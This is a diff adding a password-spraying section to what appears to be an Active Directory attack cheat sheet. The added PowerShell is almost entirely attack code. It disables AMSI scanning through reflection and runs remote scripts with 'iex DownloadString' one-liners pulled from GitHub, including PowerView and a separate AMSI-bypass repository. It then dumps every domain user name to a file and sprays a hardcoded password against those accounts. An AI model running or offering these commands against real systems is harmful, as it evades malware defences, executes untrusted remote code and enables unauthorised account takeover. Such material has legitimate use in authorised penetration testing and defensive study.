@@ -618,6 +618,27 @@ Get-ADUser -Filter 'Enabled -eq $true' |
 iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/kh4sh3i/Amsi-Bypass/main/dpspray.ps1');dpspray
 ```
 
+## 6. Active Directory Password Spraying
+```powershell
+# AMSI bypass (lab/testing)
+$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static')
+$amsi.SetValue($null,$true)
+
+# Load Powerview in memory
+iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
+
+#load active directory module in memory
+iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
+iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/kh4sh3i/Amsi-Bypass/main/Import-AD.ps1');Import-AD
+
+Get-ADUser -Properties name -Filter * | Select-Object -ExpandProperty SamAccountName |  Out-File users.txt
+type users.txt
+
+# Invoke-DomainSpray
+Invoke-DomainPasswordSpray -UserList .\users.txt -Password 1qaz!QAZ -Verbose
+```
+
+ 
 Spraying with Start-Process
 ```
 # will spray only users that currently have 0 bad password attempts
